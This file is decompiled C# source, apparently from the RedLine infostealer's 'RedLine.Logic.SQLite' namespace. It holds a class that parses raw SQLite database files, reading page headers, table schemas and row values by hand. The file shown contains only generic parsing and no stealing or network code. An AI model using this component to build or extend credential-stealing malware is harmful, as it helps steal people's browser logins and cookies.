using System;
using System.IO;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using RedLine.Logic.Extensions;

namespace RedLine.Logic.SQLite
{
	// Token: 0x0200004C RID: 76
	public class SqlConnection
	{
		// Token: 0x170000A6 RID: 166
		// (get) Token: 0x060001CC RID: 460 RVA: 0x00006ADE File Offset: 0x00004CDE
		private byte[] DataArray { get; }

		// Token: 0x170000A7 RID: 167
		// (get) Token: 0x060001CD RID: 461 RVA: 0x00006AE6 File Offset: 0x00004CE6
		private ulong DataEncoding { get; }

		// Token: 0x170000A8 RID: 168
		// (get) Token: 0x060001CE RID: 462 RVA: 0x00006AEE File Offset: 0x00004CEE
		// (set) Token: 0x060001CF RID: 463 RVA: 0x00006AF6 File Offset: 0x00004CF6
		public string[] Fields { get; set; }

		// Token: 0x170000A9 RID: 169
		// (get) Token: 0x060001D0 RID: 464 RVA: 0x00006AFF File Offset: 0x00004CFF
		public int RowLength
		{
			get
			{
				return this.SqlRows.Length;
			}
		}

		// Token: 0x170000AA RID: 170
		// (get) Token: 0x060001D1 RID: 465 RVA: 0x00006B09 File Offset: 0x00004D09
		private ushort PageSize { get; }

		// Token: 0x170000AB RID: 171
		// (get) Token: 0x060001D2 RID: 466 RVA: 0x00006B11 File Offset: 0x00004D11
		// (set) Token: 0x060001D3 RID: 467 RVA: 0x00006B19 File Offset: 0x00004D19
		private DataEntry[] DataEntries { get; set; }

		// Token: 0x170000AC RID: 172
		// (get) Token: 0x060001D4 RID: 468 RVA: 0x00006B22 File Offset: 0x00004D22
		// (set) Token: 0x060001D5 RID: 469 RVA: 0x00006B2A File Offset: 0x00004D2A
		private SQLiteRow[] SqlRows { get; set; }

		// Token: 0x170000AD RID: 173
		// (get) Token: 0x060001D6 RID: 470 RVA: 0x00006B33 File Offset: 0x00004D33
		private byte[] SQLDataTypeSize { get; }

		// Token: 0x170000AE RID: 174
		// (get) Token: 0x060001D7 RID: 471 RVA: 0x00006B3B File Offset: 0x00004D3B
		public string basePath { get; }

		// Token: 0x060001D8 RID: 472 RVA: 0x00006B44 File Offset: 0x00004D44
		public SqlConnection(string baseName)
		{
			try
			{
				this.basePath = baseName;
				this.SQLDataTypeSize = new byte[]
				{
					0,
					1,
					2,
					3,
					4,
					6,
					8,
					8,
					0,
					0
				};
				if (File.Exists(baseName))
				{
					this.DataArray = File.ReadAllBytes(baseName);
					this.PageSize = (ushort)this.ToUInt64(16, 2);
					this.DataEncoding = this.ToUInt64(56, 4);
					if (decimal.Compare(new decimal(this.DataEncoding), 0m) == 0)
					{
						this.DataEncoding = 1L;
					}
					this.ReadDataEntries(100UL);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060001D9 RID: 473 RVA: 0x00006BE8 File Offset: 0x00004DE8
		public string[] ParseTables()
		{
			string[] array = null;
			try
			{
				int num = 0;
				int num2 = this.DataEntries.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
					if (this.DataEntries[i].Type == "table")
					{
						array = (string[])Utils.CopyArray(array, new string[num + 1]);
						array[num] = this.DataEntries[i].Name;
						num++;
					}
				}
			}
			catch (Exception)
			{
			}
			return array;
		}

		// Token: 0x060001DA RID: 474 RVA: 0x00006C70 File Offset: 0x00004E70
		public string ParseValue(int rowIndex, int fieldIndex)
		{
			string result;
			try
			{
				if (rowIndex >= this.SqlRows.Length)
				{
					result = null;
				}
				else if (fieldIndex >= this.SqlRows[rowIndex].RowData.Length)
				{
					result = null;
				}
				else
				{
					result = this.SqlRows[rowIndex].RowData[fieldIndex];
				}
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060001DB RID: 475 RVA: 0x00006CD4 File Offset: 0x00004ED4
		public string ParseValue(int rowIndex, string fieldName)
		{
			string result;
			try
			{
				int num = -1;
				int num2 = this.Fields.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
					if (this.Fields[i].ToLower().Trim().CompareTo(fieldName.ToLower().Trim()) == 0)
					{
						num = i;
						break;
					}
				}
				if (num == -1)
				{
					result = null;
				}
				else
				{
					result = this.ParseValue(rowIndex, num);
				}
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060001DC RID: 476 RVA: 0x00006D4C File Offset: 0x00004F4C
		public bool ReadTable(string tableName)
		{
			bool result;
			try
			{
				int num = -1;
				int num2 = this.DataEntries.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
					if (this.DataEntries[i].Name.ToLower().CompareTo(tableName.ToLower()) == 0)
					{
						num = i;
						break;
					}
				}
				if (num == -1)
				{
					result = false;
				}
				else
				{
					string[] array = this.DataEntries[num].SqlStatement.Substring(this.DataEntries[num].SqlStatement.IndexOf("(") + 1).Split(new char[]
					{
						','
					});
					int num3 = array.Length - 1;
					for (int j = 0; j <= num3; j++)
					{
						array[j] = array[j].TrimStart(new char[0]);
						int num4 = array[j].IndexOf(" ");
						if (num4 > 0)
						{
							array[j] = array[j].Substring(0, num4);
						}
						if (array[j].IndexOf("UNIQUE") == 0)
						{
							break;
						}
						this.Fields = (string[])Utils.CopyArray(this.Fields, new string[j + 1]);
						this.Fields[j] = array[j];
					}
					result = this.ReadDataEntriesFromOffsets((ulong)((this.DataEntries[num].RootNum - 1L) * (long)((ulong)this.PageSize)));
				}
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060001DD RID: 477 RVA: 0x00006EC4 File Offset: 0x000050C4
		private ulong ToUInt64(int startIndex, int Size)
		{
			if (Size > 8 || Size == 0)
			{
				return 0UL;
			}
			ulong num = 0UL;
			for (int i = 0; i <= Size - 1; i++)
			{
				num = (num << 8 | (ulong)this.DataArray[startIndex + i]);
			}
			return num;
		}

		// Token: 0x060001DE RID: 478 RVA: 0x00006F00 File Offset: 0x00005100
		private long CalcVertical(int startIndex, int endIndex)
		{
			endIndex++;
			byte[] array = new byte[8];
			int num = endIndex - startIndex;
			bool flag = false;
			if (num == 0 | num > 9)
			{
				return 0L;
			}
			if (num == 1)
			{
				array[0] = (this.DataArray[startIndex] & 127);
				return BitConverter.ToInt64(array, 0);
			}
			if (num == 9)
			{
				flag = true;
			}
			int num2 = 1;
			int num3 = 7;
			int num4 = 0;
			if (flag)
			{
				array[0] = this.DataArray[endIndex - 1];
				endIndex--;
				num4 = 1;
			}
			for (int i = endIndex - 1; i >= startIndex; i += -1)
			{
				if (i - 1 >= startIndex)
				{
					array[num4] = (byte)(((int)((byte)(this.DataArray[i] >> (num2 - 1 & 7))) & 255 >> num2) | (int)((byte)(this.DataArray[i - 1] << (num3 & 7))));
					num2++;
					num4++;
					num3--;
				}
				else if (!flag)
				{
					array[num4] = (byte)((int)((byte)(this.DataArray[i] >> (num2 - 1 & 7))) & 255 >> num2);
				}
			}
			return BitConverter.ToInt64(array, 0);
		}

		// Token: 0x060001DF RID: 479 RVA: 0x00007008 File Offset: 0x00005208
		private int GetValues(int startIndex)
		{
			if (startIndex > this.DataArray.Length)
			{
				return 0;
			}
			int num = startIndex + 8;
			for (int i = startIndex; i <= num; i++)
			{
				if (i > this.DataArray.Length - 1)
				{
					return 0;
				}
				if ((this.DataArray[i] & 128) != 128)
				{
					return i;
				}
			}
			return startIndex + 8;
		}

		// Token: 0x060001E0 RID: 480 RVA: 0x0000705B File Offset: 0x0000525B
		public static bool ItIsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		// Token: 0x060001E1 RID: 481 RVA: 0x00007068 File Offset: 0x00005268
		private void ReadDataEntries(ulong Offset)
		{
			try
			{
				if (this.DataArray[(int)Offset] == 13)
				{
					ushort num = (this.ToUInt64((Offset.ForceTo<decimal>() + 3m).ForceTo<int>(), 2).ForceTo<decimal>() - 1m).ForceTo<ushort>();
					int num2 = 0;
					if (this.DataEntries != null)
					{
						num2 = this.DataEntries.Length;
						this.DataEntries = (DataEntry[])Utils.CopyArray(this.DataEntries, new DataEntry[this.DataEntries.Length + (int)num + 1]);
					}
					else
					{
						this.DataEntries = new DataEntry[(int)(num + 1)];
					}
					int num3 = (int)num;
					for (int i = 0; i <= num3; i++)
					{
						ulong num4 = this.ToUInt64((Offset.ForceTo<decimal>() + 8m + (i * 2).ForceTo<decimal>()).ForceTo<int>(), 2);
						if (decimal.Compare(Offset.ForceTo<decimal>(), 100m) != 0)
						{
							num4 += Offset;
						}
						int num5 = this.GetValues(num4.ForceTo<int>());
						this.CalcVertical(num4.ForceTo<int>(), num5);
						int num6 = this.GetValues((num4.ForceTo<decimal>() + num5.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<int>());
						this.DataEntries[num2 + i].ID = this.CalcVertical((num4.ForceTo<decimal>() + num5.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<int>(), num6);
						num4 = (num4.ForceTo<decimal>() + num6.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<ulong>();
						num5 = this.GetValues(num4.ForceTo<int>());
						num6 = num5;
						long value = this.CalcVertical(num4.ForceTo<int>(), num5);
						long[] array = new long[5];
						int num7 = 0;
						do
						{
							num5 = num6 + 1;
							num6 = this.GetValues(num5);
							array[num7] = this.CalcVertical(num5, num6);
							if (array[num7] > 9L)
							{
								if (SqlConnection.ItIsOdd(array[num7]))
								{
									array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
								}
								else
								{
									array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
								}
							}
							else
							{
								array[num7] = (long)((ulong)this.SQLDataTypeSize[(int)array[num7]]);
							}
							num7++;
						}
						while (num7 <= 4);
						Encoding encoding = Encoding.GetEncoding("windows-1251");
						decimal value2 = this.DataEncoding.ForceTo<decimal>();
						if (!1m.Equals(value2))
						{
							if (!2m.Equals(value2))
							{
								if (3m.Equals(value2))
								{
									encoding = Encoding.BigEndianUnicode;
								}
							}
							else
							{
								encoding = Encoding.Unicode;
							}
						}
						else
						{
							encoding = Encoding.GetEncoding("windows-1251");
						}
						this.DataEntries[num2 + i].Type = encoding.GetString(this.DataArray, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
						this.DataEntries[num2 + i].Name = encoding.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
						this.DataEntries[num2 + i].RootNum = (long)this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
						this.DataEntries[num2 + i].SqlStatement = encoding.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
				}
				else if (this.DataArray[(int)Offset] == 5)
				{
					int num8 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
					for (int j = 0; j <= num8; j++)
					{
						ushort num9 = (ushort)this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(j * 2))), 2);
						if (decimal.Compare(new decimal(Offset), 100m) == 0)
						{
							this.ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64((int)num9, 4)), 1m), new decimal((int)this.PageSize))));
						}
						else
						{
							this.ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64((int)(Offset + (ulong)num9), 4)), 1m), new decimal((int)this.PageSize))));
						}
					}
					this.ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.PageSize))));
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060001E2 RID: 482 RVA: 0x000076B0 File Offset: 0x000058B0
		private bool ReadDataEntriesFromOffsets(ulong Offset)
		{
			bool result;
			try
			{
				if (this.DataArray[(int)Offset] == 13)
				{
					int num = Convert.ToInt32(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
					int num2 = 0;
					if (this.SqlRows != null)
					{
						num2 = this.SqlRows.Length;
						this.SqlRows = (SQLiteRow[])Utils.CopyArray(this.SqlRows, new SQLiteRow[this.SqlRows.Length + num + 1]);
					}
					else
					{
						this.SqlRows = new SQLiteRow[num + 1];
					}
					int num3 = num;
					for (int i = 0; i <= num3; i++)
					{
						TypeSizes[] array = null;
						ulong num4 = this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8m), new decimal(i * 2))), 2);
						if (decimal.Compare(new decimal(Offset), 100m) != 0)
						{
							num4 += Offset;
						}
						int num5 = this.GetValues((int)num4);
						this.CalcVertical((int)num4, num5);
						int num6 = this.GetValues(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
						this.SqlRows[num2 + i].ID = this.CalcVertical(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
						num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
						num5 = this.GetValues((int)num4);
						num6 = num5;
						long num7 = this.CalcVertical((int)num4, num5);
						long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
						int num9 = 0;
						while (num8 < num7)
						{
							array = (TypeSizes[])Utils.CopyArray(array, new TypeSizes[num9 + 1]);
							num5 = num6 + 1;
							num6 = this.GetValues(num5);
							array[num9].Type = this.CalcVertical(num5, num6);
							if (array[num9].Type > 9L)
							{
								if (SqlConnection.ItIsOdd(array[num9].Type))
								{
									array[num9].Size = (long)Math.Round((double)(array[num9].Type - 13L) / 2.0);
								}
								else
								{
									array[num9].Size = (long)Math.Round((double)(array[num9].Type - 12L) / 2.0);
								}
							}
							else
							{
								array[num9].Size = (long)((ulong)this.SQLDataTypeSize[(int)array[num9].Type]);
							}
							num8 = num8 + (long)(num6 - num5) + 1L;
							num9++;
						}
						this.SqlRows[num2 + i].RowData = new string[array.Length - 1 + 1];
						int num10 = 0;
						int num11 = array.Length - 1;
						for (int j = 0; j <= num11; j++)
						{
							if (array[j].Type > 9L)
							{
								if (!SqlConnection.ItIsOdd(array[j].Type))
								{
									if (decimal.Compare(new decimal(this.DataEncoding), 1m) == 0)
									{
										this.SqlRows[num2 + i].RowData[j] = Encoding.GetEncoding("windows-1251").GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
									}
									else if (decimal.Compare(new decimal(this.DataEncoding), 2m) == 0)
									{
										this.SqlRows[num2 + i].RowData[j] = Encoding.Unicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
									}
									else if (decimal.Compare(new decimal(this.DataEncoding), 3m) == 0)
									{
										this.SqlRows[num2 + i].RowData[j] = Encoding.BigEndianUnicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
									}
								}
								else
								{
									this.SqlRows[num2 + i].RowData[j] = Encoding.GetEncoding("windows-1251").GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
							}
							else if (array[j].Type == 9L)
							{
								this.SqlRows[num2 + i].RowData[j] = "1";
							}
							else
							{
								this.SqlRows[num2 + i].RowData[j] = Convert.ToString(this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size));
							}
							num10 += (int)array[j].Size;
						}
					}
				}
				else if (this.DataArray[(int)Offset] == 5)
				{
					int num12 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
					for (int k = 0; k <= num12; k++)
					{
						ushort num13 = (ushort)this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(k * 2))), 2);
						this.ReadDataEntriesFromOffsets(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64((int)(Offset + (ulong)num13), 4)), 1m), new decimal((int)this.PageSize))));
					}
					this.ReadDataEntriesFromOffsets(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.PageSize))));
				}
				result = true;
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}
	}
}
